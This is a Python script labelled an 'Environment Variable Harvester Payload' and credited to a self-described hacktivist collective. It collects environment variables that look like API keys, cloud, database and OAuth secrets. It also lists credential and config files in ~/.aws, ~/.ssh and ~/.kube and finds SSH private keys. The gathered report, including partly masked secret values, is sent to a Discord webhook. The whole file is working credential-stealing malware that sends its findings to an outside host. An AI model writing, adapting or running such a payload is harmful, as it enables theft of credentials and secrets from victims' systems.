#!/usr/bin/env python3
"""
Environment Variable Harvester Payload
Collects environment variables, secrets, API keys, and credentials
⚡ EchoDead - Hacktivist Collective
"""

import os
import sys
import platform
import re
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

# Patterns for sensitive data
SENSITIVE_PATTERNS = {
    'API Key': [
        r'(?i)api[_-]?key',
        r'(?i)apikey',
        r'(?i)api_secret',
    ],
    'AWS Credentials': [
        r'(?i)aws[_-]?access',
        r'(?i)aws[_-]?secret',
        r'(?i)aws[_-]?session',
    ],
    'Database': [
        r'(?i)db[_-]?pass',
        r'(?i)database[_-]?pass',
        r'(?i)mysql[_-]?pass',
        r'(?i)postgres[_-]?pass',
        r'(?i)connection[_-]?string',
    ],
    'Authentication': [
        r'(?i)auth[_-]?token',
        r'(?i)bearer[_-]?token',
        r'(?i)jwt[_-]?secret',
        r'(?i)session[_-]?secret',
    ],
    'Private Keys': [
        r'(?i)private[_-]?key',
        r'(?i)secret[_-]?key',
        r'(?i)encryption[_-]?key',
    ],
    'GitHub/Git': [
        r'(?i)github[_-]?token',
        r'(?i)git[_-]?token',
        r'(?i)gh[_-]?token',
    ],
    'OAuth': [
        r'(?i)oauth[_-]?token',
        r'(?i)client[_-]?secret',
        r'(?i)client[_-]?id',
    ],
    'Email': [
        r'(?i)smtp[_-]?pass',
        r'(?i)email[_-]?pass',
        r'(?i)mail[_-]?pass',
    ],
}

def classify_variable(var_name):
    """Classify environment variable by sensitivity"""
    var_lower = var_name.lower()
    
    for category, patterns in SENSITIVE_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, var_name, re.IGNORECASE):
                return category
    
    # Check for generic credential patterns
    if any(keyword in var_lower for keyword in ['password', 'passwd', 'pwd', 'secret', 'token', 'key']):
        return 'Credential'
    
    return 'Standard'

def harvest_environment_variables():
    """Collect all environment variables with classification"""
    env_vars = os.environ.copy()
    
    categorized = {
        'sensitive': {},
        'standard': {},
    }
    
    for var_name, var_value in env_vars.items():
        category = classify_variable(var_name)
        
        if category != 'Standard':
            # Mask sensitive values
            masked_value = mask_sensitive_value(var_value)
            categorized['sensitive'][var_name] = {
                'value': masked_value,
                'category': category,
                'length': len(var_value),
            }
        else:
            categorized['standard'][var_name] = var_value
    
    return categorized

def mask_sensitive_value(value, show_chars=4):
    """Mask sensitive values while showing pattern"""
    if len(value) <= show_chars * 2:
        return '*' * len(value)
    
    return value[:show_chars] + '*' * (len(value) - show_chars * 2) + value[-show_chars:]

def search_config_files():
    """Search for configuration files that might contain secrets"""
    config_files = []
    
    search_locations = []
    
    if platform.system() == "Windows":
        search_locations = [
            os.getenv('USERPROFILE'),
            os.path.join(os.getenv('USERPROFILE', ''), '.aws'),
            os.path.join(os.getenv('USERPROFILE', ''), '.ssh'),
            os.path.join(os.getenv('USERPROFILE', ''), '.kube'),
        ]
    else:
        search_locations = [
            os.path.expanduser("~"),
            os.path.expanduser("~/.aws"),
            os.path.expanduser("~/.ssh"),
            os.path.expanduser("~/.kube"),
            os.path.expanduser("~/.config"),
        ]
    
    config_patterns = [
        '.env',
        '.env.local',
        '.env.production',
        'config.json',
        'credentials',
        'config',
        '.npmrc',
        '.pypirc',
        '.dockercfg',
        '.docker/config.json',
    ]
    
    for location in search_locations:
        if not location or not os.path.exists(location):
            continue
        
        try:
            for root, dirs, files in os.walk(location):
                depth = root[len(location):].count(os.sep)
                if depth > 2:  # Limit depth
                    continue
                
                for file in files:
                    if any(pattern in file.lower() for pattern in config_patterns):
                        file_path = os.path.join(root, file)
                        try:
                            file_size = os.path.getsize(file_path)
                            config_files.append({
                                'path': file_path,
                                'name': file,
                                'size': file_size,
                            })
                        except:
                            pass
                
                if len(config_files) >= 20:
                    break
        except:
            pass
    
    return config_files

def check_ssh_keys():
    """Check for SSH private keys"""
    ssh_dir = os.path.expanduser("~/.ssh")
    ssh_keys = []
    
    if os.path.exists(ssh_dir):
        try:
            for file in os.listdir(ssh_dir):
                file_path = os.path.join(ssh_dir, file)
                
                if os.path.isfile(file_path):
                    # Check if it's a private key
                    try:
                        with open(file_path, 'r') as f:
                            first_line = f.readline()
                            if 'PRIVATE KEY' in first_line:
                                ssh_keys.append({
                                    'path': file_path,
                                    'name': file,
                                    'type': 'Private Key',
                                })
                    except:
                        pass
        except:
            pass
    
    return ssh_keys

def main():
    print("=" * 70)
    print("ENVIRONMENT VARIABLE HARVESTER PAYLOAD")
    print("=" * 70)
    print(f"\nExecution Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Platform: {platform.system()} {platform.release()}")
    print(f"User: {os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER', 'Unknown')}")
    print(f"Hostname: {platform.node()}\n")
    
    # Harvest environment variables
    print("=" * 70)
    print("ENVIRONMENT VARIABLES")
    print("=" * 70 + "\n")
    
    env_data = harvest_environment_variables()
    
    print(f"📊 Total Variables: {len(env_data['sensitive']) + len(env_data['standard'])}")
    print(f"🔑 Sensitive Variables: {len(env_data['sensitive'])}")
    print(f"📄 Standard Variables: {len(env_data['standard'])}\n")
    
    if env_data['sensitive']:
        print("🚨 SENSITIVE VARIABLES DETECTED:\n")
        for var_name, var_info in sorted(env_data['sensitive'].items()):
            print(f"  [{var_info['category']}] {var_name}")
            print(f"    Value: {var_info['value']}")
            print(f"    Length: {var_info['length']} chars\n")
    
    # Search for config files
    print("=" * 70)
    print("CONFIG FILES")
    print("=" * 70 + "\n")
    
    config_files = search_config_files()
    
    if config_files:
        print(f"📁 Found {len(config_files)} configuration files:\n")
        for config in config_files[:10]:  # Show first 10
            print(f"  • {config['name']}")
            print(f"    Path: {config['path']}")
            print(f"    Size: {config['size']:,} bytes\n")
    else:
        print("ℹ️  No configuration files found\n")
    
    # Check SSH keys
    print("=" * 70)
    print("SSH KEYS")
    print("=" * 70 + "\n")
    
    ssh_keys = check_ssh_keys()
    
    if ssh_keys:
        print(f"🔑 Found {len(ssh_keys)} SSH private keys:\n")
        for key in ssh_keys:
            print(f"  • {key['name']} ({key['type']})")
            print(f"    Path: {key['path']}\n")
    else:
        print("ℹ️  No SSH private keys found\n")
    
    # Summary
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    
    summary = {
        "Platform": f"{platform.system()} {platform.release()}",
        "Hostname": platform.node(),
        "User": os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER', 'Unknown'),
        "Total Env Vars": len(env_data['sensitive']) + len(env_data['standard']),
        "Sensitive Vars": len(env_data['sensitive']),
        "Config Files": len(config_files),
        "SSH Keys": len(ssh_keys),
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    
    for key, value in summary.items():
        print(f"{key}: {value}")
    
    # Prepare detailed report for Discord
    discord_report = summary.copy()
    
    if env_data['sensitive']:
        sensitive_list = []
        for var_name, var_info in list(env_data['sensitive'].items())[:10]:
            sensitive_list.append(f"{var_name} ({var_info['category']})")
        discord_report["Sensitive Vars List"] = ", ".join(sensitive_list)
    
    if config_files:
        config_list = [c['name'] for c in config_files[:5]]
        discord_report["Config Files List"] = ", ".join(config_list)
    
    # Send to Discord
    if WEBHOOK_AVAILABLE:
        print("\n📤 Sending report to Discord...")
        if send_to_discord("🔐 Environment Harvester Report", discord_report):
            print("✅ Report sent successfully!")
            
            # Send sensitive variables separately if found
            if env_data['sensitive']:
                print("📤 Sending sensitive variables...")
                sensitive_details = {}
                for var_name, var_info in list(env_data['sensitive'].items())[:10]:
                    sensitive_details[f"{var_name} ({var_info['category']})"] = var_info['value']
                
                send_to_discord("🚨 Sensitive Environment Variables", sensitive_details)
        else:
            print("⚠️  Discord webhook not configured")
    else:
        print("\n⚠️  Webhook module not available")
    
    print("\n✅ Environment harvesting complete!")
    
    if env_data['sensitive']:
        print(f"\n⚠️  WARNING: {len(env_data['sensitive'])} sensitive variables detected!")
        print("   Review security posture and credential management.")

if __name__ == "__main__":
    main()
